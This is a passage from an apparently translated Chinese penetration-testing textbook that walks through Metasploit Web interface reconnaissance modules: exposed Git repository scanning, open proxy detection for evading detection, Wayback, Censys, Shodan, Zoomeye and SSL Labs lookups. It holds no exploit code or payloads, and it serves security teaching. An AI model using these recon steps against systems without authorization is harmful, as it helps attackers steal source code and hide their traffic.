1.  任务完成后，我们可以返回到分析选项卡，点击目标主机的“注释”部分，查看网站的`robots.txt`文件中列出的所有目录的列表，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9c564236-f849-4d46-8f99-c102144e21bc.png)

接下来，让我们在给定网站上查找一些配置错误的 Git 存储库。

# 查找隐藏的 Git 存储库

有时，在将代码从 Git 部署到生产服务器时，开发人员会将`git`文件夹留在公共目录中。这很危险，因为它可能允许攻击者下载应用程序的整个源代码。

让我们看看`git_scanner`模块，它可以帮助我们发现网站上配置错误的存储库：

1.  首先搜索`git_scanner`关键字：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0f4fc3c2-a4af-4b9a-9812-4e32a847158a.png)

1.  点击模块将重定向我们到模块选项页面，在那里我们指定目标地址和端口，然后点击“运行模块”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/4dcdcfdb-14d1-41ac-807d-57767345b536.png)

1.  如下图所示，创建了一个新任务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/cb1264a6-5747-4b5b-a5ba-42ba1f527fed.png)

1.  任务完成后，我们可以转到分析选项卡，点击我们的主机。在“注释”部分，我们看到辅助程序找到了存储库的`config`和`index`文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ba9759bb-3cbc-48d3-a0ba-5d4f33b65de6.png)

1.  接下来，我们可以转到“捕获的数据”选项卡，查看辅助程序找到的文件的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/47345706-391b-4583-b2d7-4fb2f703083d.png)

1.  点击“查看”将显示`config`文件的内容，其中包含`git` URL、版本和一些分支信息。这些信息也可以用来下载应用程序的整个源代码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ad66dcdf-57bc-4e2f-82bc-c3bdf8ba3a94.png)

接下来，我们将检查开放代理服务。

# 开放代理检测

这是一个非常简单的脚本。它允许我们检查我们在端口上找到的代理服务是否是开放代理。如果代理服务是开放代理，我们可以使用服务器作为代理执行不同的攻击，并且可以避免检测，特别是在红队活动期间。按照以下步骤来看看这是如何完成的：

1.  首先在模块选项卡中搜索`open_proxy`关键字，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/73f96b03-91de-42a6-baad-348edebabfb7.png)

1.  点击模块名称，我们将被重定向到选项页面，在那里我们设置 IP、端口和 URL 以检查代理设置。

1.  点击运行模块将创建一个新任务：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/158b1632-b34d-43b1-9072-22f82d4e5f0e.png)

如果代理是开放的，我们将在任务窗口中看到一条消息，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/2c8bee49-d060-4c79-8481-10a3e2de48d0.png)

现在我们对使用 Metasploit 进行主动侦察有了更好的理解，让我们继续学习被动侦察的下一个主题。

# 被动侦察

被动侦察是一种在不主动与系统接触的情况下收集有关目标的信息的方法。我们不会直接接触系统。相反，我们将使用间接方法收集有关目标的信息，例如通过 Shodan 和 Censys。

Metasploit 有许多辅助程序，可以帮助进行被动侦察。在本节中，我们将看一些使用 Metasploit 辅助程序进行被动侦察的方法。

# 存档的域名 URL

存档的域名 URL 是执行被动侦察的最佳方式之一，因为它们告诉我们有关网站历史和其 URL 的信息。有时，网站会更改，但一些旧文件和文件夹会留在服务器上；这些可能包含漏洞，并允许我们获得访问权限。Archived.org 和 Google Cache 是我们可以使用来搜索存档的域名 URL 的两个服务。

Metasploit 还有一个专门用于此目的的内置辅助程序：

1.  我们可以在搜索模块屏幕中使用`enum_wayback`关键字来找到我们需要的辅助程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c584d2e7-5d3c-4d8b-8eaf-3f61b41946ef.png)

1.  点击模块，我们将被重定向到选项页面，在那里我们可以输入网站域名。然后，点击运行模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/7f9c1b7d-f71f-4b33-942d-4d3d9a63974f.png)

创建一个新任务，并且模块成功运行，打印出它在任务窗口中找到的输出，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/cfa25a42-3518-48b0-9cca-286560d3ff95.png)

接下来，您将了解 Censys。

# Censys

Censys 是一个用于连接到互联网的设备的搜索引擎。Censys 于 2015 年在密歇根大学由开发 ZMap 的安全研究人员创建。

Censys 不断扫描和记录互联网上的设备：

1.  Metasploit 还有一个内置的辅助程序，可以进行 Censys 扫描。我们可以在模块搜索中使用`censys`关键字来定位脚本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/86ddf557-3840-4bd6-876a-49a90a06f9d8.png)

1.  点击模块将带我们到选项页面，但在这之前，我们需要登录到`censys.io`上的帐户，并获取 API ID 和 Secret，这将在模块中使用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/07bc1203-fcc6-4d99-8f7f-979711d497b9.png)

1.  我们在模块选项中输入 API ID 和 Secret，并将域名指定为目标地址。我们以`packtpub.com`为例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/32340110-8fd1-4e75-9c96-d2b60b1d6b8a.png)

1.  点击运行模块将创建一个新任务。辅助程序将搜索不同的主机和它们的端口。结果将如下截图所示打印出来：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/995bed48-2007-485e-8c6b-463bde40e501.png)

Metasploit 还有模块可以搜索 Shodan 和 Zoomeye 数据库，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/1a97f448-55bd-44b0-a248-ed49a5a9e905.png)

以下截图显示了`shodan_search`模块的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b5ce2ee4-bafa-40e7-88d3-573ef1046be1.png)

1.  要运行 Zoomeye 模块，我们可以搜索`zoomeye`关键字，并像我们为 Shodan 做的那样运行模块。如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c5251d4a-c93b-4460-9c43-8be4caca129f.png)

接下来，我们将学习 SSL 侦察。

# SSL 侦察

**安全套接字层**（**SSL**）被组织用来确保服务器和客户端之间的加密通信。在本节中，我们将看看 Metasploit 模块，该模块使用 SSL Labs 的 API 来收集有关主机上运行的 SSL 服务的情报：

1.  我们可以在模块搜索中搜索`ssllabs`关键字，以找到模块，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/be4b94e8-c54e-4d55-961e-a927c913b025.png)

1.  单击模块名称将重定向到选项页面。在这里，我们设置目标并单击运行模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/2959845c-bb3b-430b-b463-ee336d58aa83.png)

将创建一个新任务，该任务将显示我们的扫描结果和输出，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ca214953-1217-4aa3-83b2-48ca24228d7a.png)

SSL 可以透露很多东西，比如证书颁发机构、组织名称、主机和内部 IP。我们可以使用相同的模块来了解服务器上运行的 SSL 版本，检查服务器允许的密码，以及检查目标站点是否启用了**HTTP 严格传输安全**（**HSTS**）。

# 总结

在本章中，我们学习了侦察过程。我们从使用 HTTP 头和发现 Git 仓库的主动侦察开始。然后，我们转向被动扫描，查看 Shodan 和 SSL 分析，并使用存档的网页获取与目标相关的信息。

在下一章中，我们将学习如何使用 Metasploit 执行基于 Web 的枚举。我们将专注于 HTTP 方法枚举、文件和目录枚举、子域枚举等。

# 问题

1.  HTTP 头检测模块没有显示任何输出。这是否意味着模块没有正常工作？

1.  Metasploit Web 界面中的端口扫描有点有 bug。你能对此做些什么？

1.  您能在 Metasploit Web 界面中加载自定义模块，就像在 Metasploit 框架中使用它们一样吗？

1.  我的组织为我提供了安装在 VPS 上的 Metasploit Web 界面。我怎样才能确保 Web 界面的登录页面受到保护？

# 进一步阅读

要了解更多关于这个主题的信息，您可以查看以下网址：

+   [`metasploit.help.rapid7.com/docs/replacing-the-ssl-certificate`](https://metasploit.help.rapid7.com/docs/replacing-the-ssl-certificate)

+   [`github.com/rapid7/metasploit-framework/wiki/Metasploit-Web-Service`](https://github.com/rapid7/metasploit-framework/wiki/Metasploit-Web-Service)

+   [`www.offensive-security.com/metasploit-unleashed/scanner-http-auxiliary-modules/`](https://www.offensive-security.com/metasploit-unleashed/scanner-http-auxiliary-modules/)
